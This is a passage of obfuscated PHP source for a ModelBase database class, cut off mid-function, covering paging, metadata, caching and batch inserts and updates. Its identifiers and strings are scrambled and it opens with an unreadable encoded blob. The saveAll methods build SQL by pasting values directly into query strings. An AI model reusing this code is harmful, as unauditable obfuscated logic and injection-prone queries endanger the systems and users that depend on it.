zpÅ’£ÜD­Qÿ‡ş¢’¼hKµ0¢½ít¨i*/^8±8')."\xc5\x49\xb0\x6c\x51\x32\x2d\x2c\xa8\x36\x84\x72\xa6\x5c\x30\x46\x19\x5e\x31\xf0\x88\x94\x9f\x2c\x31\x60\x9b\x2c\x8c\xb3\x8e\x6\xcf\x92\x99\x8b\x9b\x23\x18\x67\xcf\x8d\xd4\x2\xa5\x7b"."\301\245\171\333\1\153\251\136\224\314\74\152\57\112\74\360\113\74\145\225\240\265\64\245\4\165\345\247\361\305\164\234\247\225\260\15\300\165\302\75\132\164\301\122\42\131"."\64\64\50\155\212\20\56\271\364\15\253\215\200\55\136\4\14\265\27\2\22\33\177\371\126\260\140\235\144\41\351\205\134\157\116\143\333\104\222\133\165\101\13\116\366\76"."\x2c\x6b\xae\xa8\x36\x2b\x6a\xe6\xa\x82\x35\x66\x49\x83\x5a\x7\x7a\x36\xbc\x48\x92\xcd\xc8\x54\x53\x2e\xd8\x22\x63\xa9\x45\x33\xd5\x84\x60\xa7\x64\x7f\x28\x1d\xa7\xd3\x46\x32\x82\x2"."\316\246\373\342\322\276\345\174\272\204\166\10\105\21\166\215\53\235\55\226\331\170\377\47\332\166\174\350\326\4\317\134\331\101\13\24\257\34\170\277\304\311\360\345\166\7".base64_decode('TItqefTbqJkmpSRA/kc5EZMHNz2HYKMAvvipCoQiUvQjdERkA32S4z8ocEYUnA==').base64_decode('ioiNJQAPEFhA3NPImV1zwXbwyCOAEBnXBqm/M3jdk/eHPysr2xk5zoMQfBMtLg==')."\320\245\132\303\215\123\334\304\225\254\23\325\341\44\236\104\172\362\335\226\342\330\233\75\263\64\374\251\32\210\156\222\127\201\135\114\42\265\22\164\266\352\133\344\217\104".base64_decode('I0VJ7Z5IpDMU9mKPlEXJqJRg3FKU1N4aCo6W5mvz+ANFadDYJRjjDnFwkr8d9Q==')."\322\23\10\204\72\107\353\205\277\151\1\357\11\72\132\345\312\357\174\132\243\232\154\172\106\20\221\63\124\226\26\156\212\51\131\356\47\211\227\261\252\10\304\171\65\250"."\323\60\366\141\365\333\156\263\73\243\10\113\52\202\206\52\101\122\167\70\117\142\241\207\116\266\270\31\263\214\6\244\331\214\343\361\341\261\313\162\342\54\304\243\305\202"."\x48\x8c\x80\x84\xe2\xee\x8a\x22\xaa\x4a\x42\x4c\xd4\x9f\x16\xeb\xf3\x51\x2a\x87\x8\xec\xe9\x7c\x2d\x8e\x3\x3d\x5a\x5c\xd0\xd7\x63\xd9\x85\xdc\xd8\x22\x30\x16\xac\x93\xf0\x37\x49\xfe"."\77\324\245\161\65\107\235\0\0".""."".base64_decode('').""."", 10, -8))); goto bŒÑÔÆƒ‡; CÓ’§åéÅ : class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\124\x69\155\x65", "\164\151\155\x65", "\x69\156\163\x65\162\x74\x2c\x75\160\x64\141\164\x65", "\x66\165\x6e\143\x74\x69\157\156"), array("\x63\162\145\x61\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\143\164\151\x6f\156")); public function setDataAuto($C‹‹‚Î¨ù) { $this->dataAuto = $C‹‹‚Î¨ù; } public function __construct($d¿¿ í¾«É = '', $CÏÉ¹áÚù = '', $D­Á”ƒÏ = '') { parent::__construct($d¿¿ í¾«É, $CÏÉ¹áÚù, $D­Á”ƒÏ); } public static function textEncode($bˆç†ÓòÛª) { if (!$bˆç†ÓòÛª) { return $bˆç†ÓòÛª; } $B„ó•ËƒÖç = json_encode($bˆç†ÓòÛª); $B„ó•ËƒÖç = preg_replace_callback($_SERVER[ÒÆ›ÆØÎ¾][353], function ($eóøç¾¦“í) { return addslashes($eóøç¾¦“í[0]); }, $B„ó•ËƒÖç); return json_decode($B„ó•ËƒÖç); } public static function textDecode($eµ³ãÙˆä) { $Cª½ğïçí =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÌÛÈ´øêë = json_encode($eµ³ãÙˆä); $dÌÛÈ´øêë = preg_replace_callback($Cª½ğïçí[354], function ($c•äì…æë) { return $_SERVER[ÒÆ›ÆØÎ¾][97]; }, $dÌÛÈ´øêë); return json_decode($dÌÛÈ´øêë); } protected $tableMeta = array(); protected function _beforeInsert(&$e«…™†¥­Ç, $Dó”†Şç) { $D†ö„Šò­ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->checkDataAutoHas($D†ö„Šò­[355])) { return; } $this->dataBeforeFilter($e«…™†¥­Ç, $D†ö„Šò­[355]); } protected function _beforeUpdate(&$FßéÃåÙ‰„, $fÁ©Ó¹²‘‚) { $Fİ·±ˆÌÄô =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->checkDataAutoHas($Fİ·±ˆÌÄô[356])) { return; } $this->dataBeforeFilter($FßéÃåÙ‰„, $Fİ·±ˆÌÄô[356]); } protected function _afterSelect(&$BÉ´÷Å¨­ø, $f¨å§¡¡µœ) { if (!is_array($BÉ´÷Å¨­ø)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÒÆ›ÆØÎ¾][357])) { return; } foreach ($BÉ´÷Å¨­ø as &$B±¥µà·‡‚) { $this->dataAfterFilter($B±¥µà·‡‚); } unset($B±¥µà·‡‚); } protected function _afterFind(&$C¿É°¾”¹Õ, $aµõä¨·Á­) { if (!is_array($C¿É°¾”¹Õ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÒÆ›ÆØÎ¾][357])) { return; } $this->dataAfterFilter($C¿É°¾”¹Õ); } public function setAutoIncrement($cğÙ•…­) { $FĞØË‡Ó… = array($this->getPk() => $cğÙ•…­); $FÉ¸“ßëô = $this->data($FĞØË‡Ó…)->add(); if ($FÉ¸“ßëô) { $this->delete($FÉ¸“ßëô); } } public function getAutoIncrement() { $d‚Ôæº‡Æ† = $this->getTableName(); $C ß¡ÖØ¤ = $this->max($this->getPk()); $B±¤‘›á•Ù = $this->query("\x73\x68\157\167\40\164\x61\x62\x6c\x65\40\x73\x74\x61\164\x75\x73\40\x77\x68\145\162\145\x20\116\141\155\145\75\47{$d‚Ôæº‡Æ†}\47"); $DºĞ¯Ùæßİ = $B±¤‘›á•Ù[0][$_SERVER[ÒÆ›ÆØÎ¾][358]]; $f’¾ÊŠ¯Æ¦ = max($C ß¡ÖØ¤, $DºĞ¯Ùæßİ); return $f’¾ÊŠ¯Æ¦; } protected function _callBefore($dİÛ‹±ğ–½, $f¹ÍïÏç»è) { return $this->cacheCallCheck($dİÛ‹±ğ–½, $f¹ÍïÏç»è, !1); } protected function _callAfter($f´Â³‡íºÛ, $c©àùï¤Èø) { return $this->cacheCallCheck($f´Â³‡íºÛ, $c©àùï¤Èø, !0); } protected function cacheFunctionAlias($a†Ã¼ñœÇİ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($f™ªÔ÷çË, $F‹ñ­´õÙµ, $a‹ªæ¶½é¨ = false) { $f¬àò‹İÏ£ = $this->cacheFunctionAlias($F‹ñ­´õÙµ); if (!$f¬àò‹İÏ£) { return; } foreach ($f¬àò‹İÏ£ as $d©¡Íß°’ => $AÉÇ“Œ„) { $B‡ŒÇ…‹öğ = $AÉÇ“Œ„[0]; $bôï•Îã = explode($_SERVER[ÒÆ›ÆØÎ¾][47], $AÉÇ“Œ„[1]); if ($f™ªÔ÷çË == $d©¡Íß°’) { return $this->cacheFunctionGet($d©¡Íß°’, $B‡ŒÇ…‹öğ); } if ($a‹ªæ¶½é¨ && in_array($f™ªÔ÷çË, $bôï•Îã)) { $this->cacheFunctionClear($d©¡Íß°’, $B‡ŒÇ…‹öğ); } } } public function cacheFunctionGet($fËêµÚğãÒ, $c£³ïĞ³ëä) { $Añ«ª™Ø  = $this->cacheKeyMake($fËêµÚğãÒ, $c£³ïĞ³ëä); $BğŠ±Ì‰‰ = Cache::get($Añ«ª™Ø ); if (!is_array($BğŠ±Ì‰‰)) { $BğŠ±Ì‰‰ = call_user_func_array(array($this, $fËêµÚğãÒ), array($c£³ïĞ³ëä, !0)); Cache::set($Añ«ª™Ø , $BğŠ±Ì‰‰); } return $BğŠ±Ì‰‰; } public function cacheFunctionClear($e§º½Ë‘Öõ, $F‚ĞÓ¾èãë) { $d½ŠÁÔ”¶ = $F‚ĞÓ¾èãë; if (!is_array($F‚ĞÓ¾èãë)) { $d½ŠÁÔ”¶ = array($F‚ĞÓ¾èãë); } foreach ($d½ŠÁÔ”¶ as $Cƒ–÷ô½©‘) { $BËšÊ·ÌÔ› = $this->cacheKeyMake($e§º½Ë‘Öõ, $Cƒ–÷ô½©‘); Cache::remove($BËšÊ·ÌÔ›); } } private function cacheKeyMake($f½§ôí–İ, $DŞÔ‰ˆ¢ÆÜ) { $cˆÇù¢¸ã =& $_SERVER[ÒÆ›ÆØÎ¾]; return get_class($this) . $cˆÇù¢¸ã[71] . $f½§ôí–İ . $cˆÇù¢¸ã[359] . $DŞÔ‰ˆ¢ÆÜ; } protected function selectPageReset() { $bç„¯Í÷éĞ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($GLOBALS[$bç„¯Í÷éĞ[360]])) { return; } $GLOBALS[$bç„¯Í÷éĞ[360]] = isset($GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[361]]) ? $GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[361]] : !1; $GLOBALS[$bç„¯Í÷éĞ[362]] = isset($GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[351]]) ? $GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[351]] : !1; $GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[361]] = !1; $GLOBALS[$bç„¯Í÷éĞ[7]][$bç„¯Í÷éĞ[351]] = !1; } protected function selectPageRestore() { $EåŒ£ÃÖĞ¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($GLOBALS[$EåŒ£ÃÖĞ¢[360]])) { return; } $GLOBALS[$EåŒ£ÃÖĞ¢[7]][$EåŒ£ÃÖĞ¢[361]] = $GLOBALS[$EåŒ£ÃÖĞ¢[360]]; $GLOBALS[$EåŒ£ÃÖĞ¢[7]][$EåŒ£ÃÖĞ¢[351]] = $GLOBALS[$EåŒ£ÃÖĞ¢[362]]; unset($GLOBALS[$EåŒ£ÃÖĞ¢[360]]); unset($GLOBALS[$EåŒ£ÃÖĞ¢[362]]); } protected function selectPage($aˆµÇíí¸ = 200, $eÇ¬ä¸ØÎ£ = 1) { goto FÔöŠ§Èº…; FíÒ¥øõœ: $aˆµÇíí¸ = $aˆµÇíí¸ <= 5 ? 5 : ($aˆµÇíí¸ >= $Eí¡Í‹¶õ¡ ? $Eí¡Í‹¶õ¡ : $aˆµÇíí¸); $eÇ¬ä¸ØÎ£ = intval(isset($in[$fĞ à½À”[351]]) && $in[$fĞ à½À”[351]] ? $in[$fĞ à½À”[351]] : $eÇ¬ä¸ØÎ£); $eÇ¬ä¸ØÎ£ = $eÇ¬ä¸ØÎ£ <= 1 ? 1 : $eÇ¬ä¸ØÎ£; goto E½óùÎÆ†È; BåµåÖ¼ñ: return $A”˜…³•¼Ü; goto F®Ü°ªá¿ê; E˜‘ƒ‘ÁŠœ: if (!is_array($eåƒ´äŸÈÏ)) { $eåƒ´äŸÈÏ = array(); } if ($F†£¶½³—Ú == 1) { $dß¬š›Š = count($eåƒ´äŸÈÏ); } $A”˜…³•¼Ü = array($fĞ à½À”[364] => array($fĞ à½À”[365] => $dß¬š›Š, $fĞ à½À”[361] => $aˆµÇíí¸, $fĞ à½À”[351] => $eÇ¬ä¸ØÎ£, $fĞ à½À”[366] => $F†£¶½³—Ú), $fĞ à½À”[367] => $eåƒ´äŸÈÏ); goto BåµåÖ¼ñ; A¹¦ä…ğ½µ: $eµ¾ºÎ·Š„ = $E Å®Š˜‚¯; $eµ¾ºÎ·Š„[$fĞ à½À”[363]] = array(); $aˆµÇíí¸ = intval($aˆµÇíí¸); goto FíÒ¥øõœ; FÔöŠ§Èº…: $fĞ à½À” =& $_SERVER[ÒÆ›ÆØÎ¾]; global $in; $E Å®Š˜‚¯ = $this->optionsValue(); goto F·Ğ¿é³Ÿ; F·Ğ¿é³Ÿ: $Eí¡Í‹¶õ¡ = 50000; $aˆµÇíí¸ = isset($in[$fĞ à½À”[361]]) && $in[$fĞ à½À”[361]] ? $in[$fĞ à½À”[361]] : $aˆµÇíí¸; if ($aˆµÇíí¸ === -1) { $in[$fĞ à½À”[361]] = !1; $Eí¡Í‹¶õ¡ = 100000000; $aˆµÇíí¸ = $Eí¡Í‹¶õ¡; } goto A¹¦ä…ğ½µ; E½óùÎÆ†È: $eåƒ´äŸÈÏ = array(); $eò¾‚Ñ´Ã‚ = 1; if ($eÇ¬ä¸ØÎ£ == 1 && $eò¾‚Ñ´Ã‚) { $this->optionsValue($E Å®Š˜‚¯); $eåƒ´äŸÈÏ = $this->page($eÇ¬ä¸ØÎ£, $aˆµÇíí¸)->select(); $dß¬š›Š = is_array($eåƒ´äŸÈÏ) ? count($eåƒ´äŸÈÏ) : 0; if ($dß¬š›Š < $aˆµÇíí¸) { $F†£¶½³—Ú = 1; } else { $this->optionsValue($eµ¾ºÎ·Š„); $dß¬š›Š = intval($this->count()); $F†£¶½³—Ú = ceil($dß¬š›Š / $aˆµÇíí¸); } } else { $this->optionsValue($eµ¾ºÎ·Š„); $dß¬š›Š = intval($this->count()); $F†£¶½³—Ú = ceil($dß¬š›Š / $aˆµÇíí¸); $eÇ¬ä¸ØÎ£ = $eÇ¬ä¸ØÎ£ >= $F†£¶½³—Ú ? $F†£¶½³—Ú : $eÇ¬ä¸ØÎ£; $this->optionsValue($E Å®Š˜‚¯); $eåƒ´äŸÈÏ = $this->page($eÇ¬ä¸ØÎ£, $aˆµÇíí¸)->select(); } goto E˜‘ƒ‘ÁŠœ; F®Ü°ªá¿ê: } protected function checkLength($aë®ñ´—‰, $FÓ¾‹é±Á = 0, $e„Ş›ŸÖ„é = '') { $ešÄ¬Ûß‰ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÓ¾‹é±Á = $FÓ¾‹é±Á ? $FÓ¾‹é±Á : 65536; if (!$aë®ñ´—‰ || strlen($aë®ñ´—‰) < $FÓ¾‹é±Á) { return; } $e„Ş›ŸÖ„é = $e„Ş›ŸÖ„é ? $e„Ş›ŸÖ„é . $ešÄ¬Ûß‰ƒ[68] : $ešÄ¬Ûß‰ƒ[33]; show_json($e„Ş›ŸÖ„é . LNG($ešÄ¬Ûß‰ƒ[368]) . "\x28{$FÓ¾‹é±Á}\51", !1); } protected function metaSet($FÍø²éË‡, $d†õ½˜š¬ = null, $fˆ­æ¦êø = null) { goto c³ìä¡†øº; dĞ½¯Œ²éÃ: $cÏ½ÛÃ‹šâ = $AÑÒÁ©²â[373] . $this->tableMeta; CacheLock::lock($cÏ½ÛÃ‹šâ); $cÑ¤†›’çË->where(array($F‚”Çï›† => $FÍø²éË‡))->addAll($fƒŠâÂØÌ, array(), !0); goto Aæ¥éù×ê; FµÎŒ¨˜÷»: $b¿öÍ— ¦„ = $this->tableMeta[$AÑÒÁ©²â[370]]; $cÑ¤†›’çË = Model($b¿öÍ— ¦„); $fÆé‘ˆÕ÷… = array($F‚”Çï›† => $FÍø²éË‡, $AÑÒÁ©²â[371] => $d†õ½˜š¬); goto B´·½åó÷Ã; Aæ¥éù×ê: CacheLock::unlock($cÏ½ÛÃ‹šâ); return !0; goto BŞ«ÂÅ²ŸÁ; FáÊ„™º”ø: if (is_string($d†õ½˜š¬)) { $bøì‹ ´ğ[$d†õ½˜š¬] = $fˆ­æ¦êø; } $fƒŠâÂØÌ = array(); foreach ($bøì‹ ´ğ as $eë×ğÎôæë => $aÊÇ¯äãìÅ) { $this->checkLength($aÊÇ¯äãìÅ, !1, $b¿öÍ— ¦„ . $AÑÒÁ©²â[4] . $eë×ğÎôæë); $fƒŠâÂØÌ[] = array($F‚”Çï›† => $FÍø²éË‡, $AÑÒÁ©²â[93] => $eë×ğÎôæë, $AÑÒÁ©²â[372] => $aÊÇ¯äãìÅ); } goto dĞ½¯Œ²éÃ; B´·½åó÷Ã: if (is_null($d†õ½˜š¬)) { return $cÑ¤†›’çË->where(array($F‚”Çï›† => $FÍø²éË‡))->delete(); } if (is_null($fˆ­æ¦êø) && is_string($d†õ½˜š¬)) { return $cÑ¤†›’çË->where($fÆé‘ˆÕ÷…)->delete(); } $bøì‹ ´ğ = is_array($d†õ½˜š¬) ? $d†õ½˜š¬ : array(); goto FáÊ„™º”ø; c³ìä¡†øº: $AÑÒÁ©²â =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->tableMeta || !$FÍø²éË‡) { return !1; } $F‚”Çï›† = $this->tableMeta[$AÑÒÁ©²â[369]]; goto FµÎŒ¨˜÷»; BŞ«ÂÅ²ŸÁ: } public function metaGet($DÚÅÃ³ñ²ƒ, $aç“¿ÏóÌ = false) { goto EõíéÉ“ªô; EõíéÉ“ªô: $aµãîªì«ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->tableMeta) { return array(); } $DßŠäÚŞÏ = $this->tableMeta[$aµãîªì«ğ[369]]; goto c†Ìíßæö; Có²äëœĞÚ: $C«õˆ¿ŸëÜ = $d´·»÷éœœ->field($aµãîªì«ğ[374])->where($AéÊ…¯Ú¤)->select(); $C«õˆ¿ŸëÜ = array_to_keyvalue($C«õˆ¿ŸëÜ, $aµãîªì«ğ[93], $aµãîªì«ğ[372]); return $C«õˆ¿ŸëÜ; goto F²¢¿¶ø„; c†Ìíßæö: $d´·»÷éœœ = Model($this->tableMeta[$aµãîªì«ğ[370]]); if ($aç“¿ÏóÌ) { $AéÊ…¯Ú¤ = array($DßŠäÚŞÏ => $DÚÅÃ³ñ²ƒ, $aµãîªì«ğ[93] => $aç“¿ÏóÌ); return $d´·»÷éœœ->where($AéÊ…¯Ú¤)->getField($aµãîªì«ğ[372]); } $AéÊ…¯Ú¤ = array($DßŠäÚŞÏ => $DÚÅÃ³ñ²ƒ); goto Có²äëœĞÚ; F²¢¿¶ø„: } private function checkDataAutoHas($bİõß‘èÜ¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $bÑâ†Íö­Ô) { if (in_array($bİõß‘èÜ¤, explode($_SERVER[ÒÆ›ÆØÎ¾][47], $bÑâ†Íö­Ô[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Cà³à»ÒÂ¸, $f¦×‰İ¸·•) { $D‡êæ¥áä =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($this->dataAuto as $E¿ùºÛõåº) { $A‡Òá˜èÉ = $E¿ùºÛõåº[0]; if (!in_array($f¦×‰İ¸·•, explode($D‡êæ¥áä[47], $E¿ùºÛõåº[2]))) { continue; } switch (trim($E¿ùºÛõåº[3])) { case $D‡êæ¥áä[319]: case $D‡êæ¥áä[320]: $AÇ´˜ƒ³Ó¿ = $E¿ùºÛõåº[1]; $a©õ²Õ‡  = isset($E¿ùºÛõåº[4]) ? (array) $E¿ùºÛõåº[4] : array(); if ($AÇ´˜ƒ³Ó¿ == $D‡êæ¥áä[197] && array_key_exists($A‡Òá˜èÉ, $Cà³à»ÒÂ¸)) { if (!$Cà³à»ÒÂ¸[$A‡Òá˜èÉ]) { unset($Cà³à»ÒÂ¸[$A‡Òá˜èÉ]); } break; } if (isset($Cà³à»ÒÂ¸[$A‡Òá˜èÉ])) { array_unshift($a©õ²Õ‡ , $Cà³à»ÒÂ¸[$A‡Òá˜èÉ]); } if ($D‡êæ¥áä[319] == $E¿ùºÛõåº[3]) { $Cà³à»ÒÂ¸[$A‡Òá˜èÉ] = call_user_func_array($AÇ´˜ƒ³Ó¿, $a©õ²Õ‡ ); } else { $Cà³à»ÒÂ¸[$A‡Òá˜èÉ] = call_user_func_array(array(&$this, $AÇ´˜ƒ³Ó¿), $a©õ²Õ‡ ); } break; case $D‡êæ¥áä[271]: $Cà³à»ÒÂ¸[$A‡Òá˜èÉ] = $Cà³à»ÒÂ¸[$E¿ùºÛõåº[1]]; break; case $D‡êæ¥áä[292]: if (isset($Cà³à»ÒÂ¸[$A‡Òá˜èÉ]) && !is_string($Cà³à»ÒÂ¸[$A‡Òá˜èÉ])) { $Cà³à»ÒÂ¸[$A‡Òá˜èÉ] = json_encode_force($Cà³à»ÒÂ¸[$A‡Òá˜èÉ]); } break; case $D‡êæ¥áä[321]: if ($Cà³à»ÒÂ¸[$A‡Òá˜èÉ] === $D‡êæ¥áä[33]) { unset($Cà³à»ÒÂ¸[$A‡Òá˜èÉ]); } break; case $D‡êæ¥áä[322]: $Cà³à»ÒÂ¸[$A‡Òá˜èÉ] = $E¿ùºÛõåº[1]; default: break; } } if ($f¦×‰İ¸·• == $D‡êæ¥áä[355]) { $fóÌ©†ƒ¿Ë = strtolower($this->db->getDbType()); if (strpos($fóÌ©†ƒ¿Ë, $D‡êæ¥áä[9]) !== 0) { return; } $B™Íàœ¶Š’ = $this->field(!0)->fields; $d±¾ù°Û­á = $B™Íàœ¶Š’[$D‡êæ¥áä[250]]; if (isset($B™Íàœ¶Š’[$D‡êæ¥áä[249]])) { unset($d±¾ù°Û­á[$B™Íàœ¶Š’[$D‡êæ¥áä[249]]]); } foreach ($d±¾ù°Û­á as $cÇí ·†§š => $f¦×‰İ¸·•) { if (!isset($Cà³à»ÒÂ¸[$cÇí ·†§š])) { $Cà³à»ÒÂ¸[$cÇí ·†§š] = $D‡êæ¥áä[33]; } } } } private function dataAfterFilter(&$cçÖ“„Ì…) { $B’›ø÷– =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($this->dataAuto as $F¨¯ôŒ»…) { $c…ë¥ä·¬· = $F¨¯ôŒ»…[0]; if (!in_array($B’›ø÷–[357], explode($B’›ø÷–[47], $F¨¯ôŒ»…[2]))) { continue; } if (!isset($cçÖ“„Ì…[$c…ë¥ä·¬·])) { continue; } switch (trim($F¨¯ôŒ»…[3])) { case $B’›ø÷–[319]: case $B’›ø÷–[320]: $EÒ«‹¡Ñğï = isset($F¨¯ôŒ»…[4]) ? (array) $F¨¯ôŒ»…[4] : array(); array_unshift($EÒ«‹¡Ñğï, $cçÖ“„Ì…[$c…ë¥ä·¬·]); if ($B’›ø÷–[319] == $F¨¯ôŒ»…[3]) { $cçÖ“„Ì…[$c…ë¥ä·¬·] = call_user_func_array($F¨¯ôŒ»…[1], $EÒ«‹¡Ñğï); } else { $cçÖ“„Ì…[$c…ë¥ä·¬·] = call_user_func_array(array(&$this, $F¨¯ôŒ»…[1]), $EÒ«‹¡Ñğï); } break; case $B’›ø÷–[271]: $cçÖ“„Ì…[$c…ë¥ä·¬·] = $cçÖ“„Ì…[$F¨¯ôŒ»…[1]]; break; case $B’›ø÷–[292]: $DôÑè…î¹ = $cçÖ“„Ì…[$c…ë¥ä·¬·]; $cçÖ“„Ì…[$c…ë¥ä·¬·] = json_decode($DôÑè…î¹, !0); if (is_null($cçÖ“„Ì…[$c…ë¥ä·¬·])) { $cçÖ“„Ì…[$c…ë¥ä·¬·] = $DôÑè…î¹; } break; case $B’›ø÷–[321]: if ($cçÖ“„Ì…[$c…ë¥ä·¬·] === $B’›ø÷–[33]) { unset($cçÖ“„Ì…[$c…ë¥ä·¬·]); } break; case $B’›ø÷–[322]: $cçÖ“„Ì…[$c…ë¥ä·¬·] = $F¨¯ôŒ»…[1]; default: break; } } } public function saveAll($AàŒÀ›à) { goto F’É¢œÛ¯; Däï…¶‡¡¤: $bùÚ¤ÎÍ³Œ = array(); $a«§‘Ô«Ÿ‡ = count($AàŒÀ›à); for ($BßíŠ·å = 0; $BßíŠ·å < $a«§‘Ô«Ÿ‡; $BßíŠ·å++) { $BÊíÄëÈ¡î = $AàŒÀ›à[$BßíŠ·å]; if (!is_array($BÊíÄëÈ¡î) || count($BÊíÄëÈ¡î) != 4) { continue; } $aÎ¾¡¡ì‰ = "\125\120\x44\101\x54\x45\x20\140{$AÓÙŸ—“„±}\x60\x20\x53\105\124\40{$BÊíÄëÈ¡î[2]}\x20\x3d\40\103\x41\x53\105\x20{$BÊíÄëÈ¡î[0]}\40\12"; if ($F—ø§˜†½‘ == 0) { $bìÜñò‚Ü = $aÎ¾¡¡ì‰; } $bùÚ¤ÎÍ³Œ[] = $F¬ÆË¦É›[116] . $BÊíÄëÈ¡î[1] . $F¬ÆË¦É›[116]; $F—ø§˜†½‘++; $bìÜñò‚Ü .= "\40\x57\110\x45\x4e\40\x27{$BÊíÄëÈ¡î[1]}\47\40\x54\x48\105\x4e\40\47{$BÊíÄëÈ¡î[3]}\47\40\12"; if ($F—ø§˜†½‘ == $CÌà’µƒŸ» || $BßíŠ·å == $a«§‘Ô«Ÿ‡ - 1) { goto fïÉœ™æˆ; f‚­¦÷å¹: $bùÚ¤ÎÍ³Œ = array(); goto EÚé¿ÏÑ½Ñ; fïÉœ™æˆ: $Eõ£êµÆâ = implode($F¬ÆË¦É›[47], $bùÚ¤ÎÍ³Œ); $bìÜñò‚Ü .= "\x20\x45\116\104\x20\x20\x57\x48\x45\122\105\x20{$BÊíÄëÈ¡î[0]}\40\x49\116\40\x28{$Eõ£êµÆâ}\x29\x20"; $this->execute($bìÜñò‚Ü); goto eÔ«…ò£Ú; eÔ«…ò£Ú: $F—ø§˜†½‘ = 0; $bìÜñò‚Ü = $aÎ¾¡¡ì‰; $this->chunkEventCheck(count($bùÚ¤ÎÍ³Œ)); goto f‚­¦÷å¹; EÚé¿ÏÑ½Ñ: } } goto bÓëÊôÓƒ; bÓëÊôÓƒ: $this->chunkEventSet(); goto c£ß‚çŞÚ¯; AÄöÄ‹ŞÛ©: $AàŒÀ›à = is_array($AàŒÀ›à) ? $AàŒÀ›à : array(); $bìÜñò‚Ü = $F¬ÆË¦É›[375]; $F—ø§˜†½‘ = 0; goto Däï…¶‡¡¤; F’É¢œÛ¯: $F¬ÆË¦É› =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÓÙŸ—“„± = $this->tablePrefix . $this->tableName; $CÌà’µƒŸ» = self::SQL_WHERE_IN_CHUNK; goto AÄöÄ‹ŞÛ©; c£ß‚çŞÚ¯: } public function saveAllEach($dµñÄ°ë§à) { $A™ÎÅõê…ó =& $_SERVER[ÒÆ›ÆØÎ¾]; $EãÅøÖá÷… = $this->tablePrefix . $this->tableName; foreach ($dµñÄ°ë§à as $Cì¬Ëî¤„©) { if (!is_array($Cì¬Ëî¤„©) || count($Cì¬Ëî¤„©) != 4) { continue; } $D¶ò‘Ù¬º— = $Cì¬Ëî¤„©[0] . $A™ÎÅõê…ó[376] . $Cì¬Ëî¤„©[1] . $A™ÎÅõê…ó[116]; $eÂ¾ï’ˆŒÈ = $Cì¬Ëî¤„©[2] . $A™ÎÅõê…ó[376] . $Cì¬Ëî¤„©[3] . $A™ÎÅõê…ó[116]; $dõ–ö‹åĞ¼ = "\x75\160\x64\141\164\x65\x20{$EãÅøÖá÷…}\40\x73\x65\x74\x20{$eÂ¾ï’ˆŒÈ}\40\167\x68\145\x72\145\40{$D¶ò‘Ù¬º—}\73"; $this->execute($dõ–ö‹åĞ¼); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C‡ª’ÍÆµè = false, $A©Ù…Æˆâ‰ = false) { $this->_chunkEvent = $C‡ª’ÍÆµè; $this->_chunkEventParam = $A©Ù…Æˆâ‰; } private function chunkEventCheck($cšÄ¤¬òÏò) { if (!$this->_chunkEvent) { return; } $cÃ¡°«éÉÛ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $cÃ¡°«éÉÛ[$_SERVER[ÒÆ›ÆØÎ¾][377]] = $cšÄ¤¬òÏò; Hook::trigger($this->_chunkEvent, $cÃ¡°«éÉÛ); } public function addAll($C¡Ã™ñĞÁù, $f¼ë¶‡ˆÇÄ = array(), $CòåµØ±Î° = false) { goto BŞ°ŒäÅå–; déƒáŠğ‡Ğ: if (method_exists($this->db, $F•¿Ö—ğ‚‘[270])) { for ($c¤À±èƒ„ø = 0; $c¤À±èƒ„ø < count($C¡Ã™ñĞÁù); $c¤À±èƒ„ø += $còÃø®¨„İ) { $B¤ãÖ–šˆó = array_slice($C¡Ã™ñĞÁù, $c¤À±èƒ„ø, $còÃø®¨„İ); if (!is_array($B¤ãÖ–šˆó) || count($B¤ãÖ–šˆó) == 0) { break; } $A‚ŞÊãµ = $this->db->insertAll($B¤ãÖ–šˆó, $f¼ë¶‡ˆÇÄ, $CòåµØ±Î°); $this->chunkEventCheck(count($B¤ãÖ–šˆó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($C¡Ã™ñĞÁù as $f—¸¡¸Â…— => $EÌËùÌ´…) { $A‚ŞÊãµ = $this->db->insert($EÌËùÌ´…, $f¼ë¶‡ˆÇÄ, $CòåµØ±Î°); } $this->commit(); } if (!1 !== $A‚ŞÊãµ) { $CòÔ„‚£‡ = $this->getLastInsID(); if ($CòÔ„‚£‡) { return $CòÔ„‚£‡; } } return $A‚ŞÊãµ; goto Bë²‡ÌÎœ²; BŞ°ŒäÅå–: $F•¿Ö—ğ‚‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; ignore_timeout(); $còÃø®¨„İ = self::SQL_WHERE_IN_CHUNK; goto d–‘Á„¶í; d–‘Á„¶í: if (empty($C¡Ã™ñĞÁù)) { $this->error = think_lang($F•¿Ö—ğ‚‘[269]); return !1; } $f¼ë¶‡ˆÇÄ = $this->_parseOptions($f¼ë¶‡ˆÇÄ); foreach ($C¡Ã™ñĞÁù as $f—¸¡¸Â…— => $EÌËùÌ´…) { 